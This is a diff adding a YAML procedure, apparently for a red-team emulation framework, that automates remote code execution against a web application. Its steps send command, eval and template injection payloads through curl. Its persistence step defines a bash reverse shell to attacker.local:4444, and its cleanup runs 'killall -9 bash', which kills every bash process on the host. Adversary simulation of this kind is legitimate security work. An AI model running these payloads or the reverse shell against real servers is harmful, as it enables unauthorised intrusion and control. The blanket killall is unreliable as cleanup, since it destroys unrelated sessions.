@@ -1,0 +1,105 @@
+name: "015: Remote code execution"
+description: "Achieve remote code execution on web servers through various injection vectors"
+id: "h8i1e3j6-2g5f-8e0j-3h6i-9f7g2e5j0i1h"
+api_version: "2.0"
+platform: darwin
+tags:
+  - initial_access
+  - web_exploitation
+  - remote_code_execution
+  - rce
+actors: []
+mitre_attack:
+  tactics:
+    - initial_access
+  techniques:
+    - T1190
+procedure_examples: []
+arguments:
+  target_url:
+    description: "Target web application URL"
+    type: string
+    required: true
+    default: "http://vulnerable-app.local/process.php"
+  injection_vector:
+    description: "Vector for code injection (command, eval, template, code)"
+    type: string
+    required: true
+    default: "command"
+  command_payload:
+    description: "System command to execute"
+    type: string
+    required: true
+    default: "id"
+  param_name:
+    description: "Parameter name to inject code into"
+    type: string
+    required: true
+    default: "cmd"
+steps:
+  - name: "Identify injection point"
+    description: "Identify the vulnerable injection point in the application"
+    command: |
+      echo "[*] Identifying injection point: ${param_name}"
+      curl -s "${target_url}" | grep -i "form\|input\|${param_name}" | head -10
+  - name: "Test code execution"
+    description: "Test basic code execution capability"
+    command: |
+      echo "[*] Testing ${injection_vector} injection on parameter: ${param_name}"
+      encoded=$(echo "${command_payload}" | jq -sRr @uri)
+      curl -s "${target_url}?${param_name}=${encoded}" > /tmp/rce_response.txt
+      echo "[+] Response captured"
+  - name: "Execute payload"
+    description: "Execute the malicious payload on the target"
+    command: |
+      echo "[*] Executing payload: ${command_payload}"
+      case "${injection_vector}" in
+        command)
+          encoded=$(echo "; ${command_payload}" | jq -sRr @uri)
+          curl -s "${target_url}?${param_name}=${encoded}" 2>&1 | grep -v "^$" | head -20
+          ;;
+        eval)
+          encoded=$(echo "system('${command_payload}')" | jq -sRr @uri)
+          curl -s "${target_url}?${param_name}=${encoded}" 2>&1 | head -20
+          ;;
+        template)
+          encoded=$(echo "{{7*7}}" | jq -sRr @uri)
+          curl -s "${target_url}?${param_name}=${encoded}" 2>&1 | head -20
+          ;;
+        *)
+          curl -s "${target_url}?${param_name}=${command_payload}"
+          ;;
+      esac
+  - name: "Establish persistence"
+    description: "Create mechanisms for persistent access"
+    command: |
+      echo "[*] Establishing persistence"
+      persistence_cmd="bash -i >& /dev/tcp/attacker.local/4444 0>&1"
+      echo "[*] Would execute reverse shell: ${persistence_cmd}"
+checks:
+  - name: "RCE execution check"
+    description: "Verify code execution on target"
+    command: "grep -q 'root\\|uid\\|www\\|apache' /tmp/rce_response.txt && echo 'PASS' || echo 'FAIL'"
+  - name: "Command output detection"
+    description: "Verify command output in response"
+    command: "[ -s /tmp/rce_response.txt ] && echo 'PASS' || echo 'FAIL'"
+tests:
+  - name: "rce_test"
+    description: "Test RCE in dry run mode"
+    dry_run: true
+    command: |
+      echo "[TEST] Remote Code Execution Test (Dry Run)"
+      echo "[TEST] Target: ${target_url}"
+      echo "[TEST] Vector: ${injection_vector}"
+      echo "[TEST] Parameter: ${param_name}"
+      echo "[TEST] Command: ${command_payload}"
+      echo "[TEST] Would execute payload and capture output"
+cleanup:
+  - name: "Remove RCE artifacts"
+    description: "Clean up RCE testing files and reverse shells"
+    command: |
+      echo "[*] Cleaning up RCE artifacts"
+      rm -f /tmp/rce_response.txt 2>/dev/null
+      rm -f /tmp/reverse_shell_* 2>/dev/null
+      killall -9 bash 2>/dev/null || true
+      echo "[+] RCE cleanup complete"
